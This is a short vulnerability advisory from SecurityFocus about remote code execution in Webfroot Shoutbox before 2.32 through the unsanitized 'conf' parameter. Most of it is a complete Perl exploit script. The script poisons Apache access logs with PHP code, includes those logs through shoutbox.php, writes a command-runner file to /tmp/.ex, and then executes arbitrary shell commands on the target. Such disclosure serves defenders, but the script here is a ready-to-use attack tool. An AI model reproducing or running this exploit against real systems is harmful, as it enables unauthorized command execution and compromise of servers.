source: http://www.securityfocus.com/bid/7746/info

Shoutbox is prone to an issue that may result in the execution of attacker-supplied code. The vulnerability exists due to insufficient sanitization of the 'conf' URI parameter.

An attacker can exploit this vulnerability to execute arbitrary commands on a vulnerable system using the PHP interpreter.

#!/usr/bin/perl
#
# Webfroot Shoutbox < 2.32 on apache exploit
# by pokleyzz of d'scan clanz
# 
# Greet: 
#	tynon, sk ,wanvadder,  flyguy, sutan ,spoonfork, tenukboncit, kerengge_kurus , 
#	s0cket370 , b0iler and d'scan clan.
#
# Shout  to:
#	 #vuln , #mybsd , #mylinux 
#
# Just for fun :). Weekend stuff ..
#

use IO::Socket;

my $host = "127.0.0.1";
my $port = 80;
my $shoutbox = "shoutbox.php?conf=";
my $shoutboxpath = "/shoutbox";
my $cmd = "ls -l";
my $conn;
my $type;
my @logs = (	
		"/etc/httpd/logs/acces_log",
		"/etc/httpd/logs/acces.log",
		"/var/www/logs/access_log",
		"/var/www/logs/access.log",
		"/usr/local/apache/logs/access_log",
		"/usr/local/apache/logs/access.log",
		"/var/log/apache/access_log",
		"/var/log/apache/access.log",
		"/var/log/httpd/access_log",
		"/var/log/httpd/access.log",
		#"D:/apps/Apache Group/Apache2/logs/access.log"	
	);
	
my $qinit = "GET /<?\$h=fopen('/tmp/.ex','w+');fwrite(\$h,'Result:<pre><?system(\$cmd);?></pre>');fclose(\$h);?> HTTP/1.1\nHost: 127.0.0.1\nConnection: Close\n\n";
my $conn;


if ($ARGV[0] eq "x" || $ARGV[0] eq "r"){
	$type = $ARGV[0];	
}
else {
	print "[x] Webfroot Shoutbox < 2.32 on apache exploit \n\tby pokleyzz of d' scan clan\n\n";
	print "Usage: \n jeritan_batinku.pl (x|r) host [command] [path] [port]\n";
	print "\ttype\tx = exploit | r = run command (after run with x option)\n";
	print "\thost\thostname\n";
	print "\tcommand\tcommand to execute on remote server\n";
	print "\tpath\tpath to shoutbox installation ex: /shoutbox\n";
	print "\tport\tport number\n";
	exit;
}

if ($ARGV[1]){
	$host = $ARGV[1];	
}

if ($ARGV[2]){
	$cmd = $ARGV[2];	
}
if ($ARGV[3]){
	$shoutboxpath = $ARGV[3];	
}
if ($ARGV[4]){
	$port = int($ARGV[4]);	
}

$cmd =~ s/ /+/g;

sub connect_to {
	#print "[x] Connect to $host on port $port ...\n";
	$conn = IO::Socket::INET->new (
					Proto => "tcp",
					PeerAddr => "$host",
					PeerPort => "$port",
					) or die "[*] Can't connect to $host on port $port ...\n";
	$conn-> autoflush(1);
}

sub connect_end {
	#print "[x] Close connection\n";
	close($conn);
}

sub exploit {
	my $access_log = $_[0];
	my $result = "";
	$access_log =~ s/ /+/g;
	my $query = "GET ${shoutboxpath}/${shoutbox}${access_log} HTTP/1.1\nHost: $host\nConnection: Close\n\n";
	print "$query";
	print "[x] Access log : ", $access_log ,"\n";
	&connect_to;
	print $conn $query;
	while ($line = <$conn>) { 
		$result = $line;
		#print $result;
	};
	&connect_end;
	
}

sub run_cmd {
	my $conf="/tmp/.ex";
	#my $conf="d:/tmp/.ex";
	my $result = "";
	my $query = "GET ${shoutboxpath}/${shoutbox}${conf}&cmd=$cmd HTTP/1.1\nHost: $host\nConnection: Close\n\n";
	
	print "[x] Run command ...\n";
	&connect_to;
	print $conn $query;
	while ($line = <$conn>) { 
		$result .= $line;
	};
	&connect_end;
	if ($result =~ /Result:/){
		print $result;
	} else {
		print $result;
		print "[*] Failed ...";
	}		

}

sub insert_code {
	my $result = "";
	print "[x] Access log : ", $access_log ,"\n";
	print "[x] Insert php code into apache access log ...\n";
	&connect_to;
	print $conn "$qinit";
	while ($line = <$conn>) { 
		$result .= $line;
	};
	&connect_end;
	print $result;	
}

if ($type eq "x"){
	&insert_code;
	print "[x] Trying to exploit ...\n";
	for ($i = 0;$i <= $#logs; $i++){
		&exploit($logs[$i]);
	}
	&run_cmd;
} else {
	&run_cmd;
}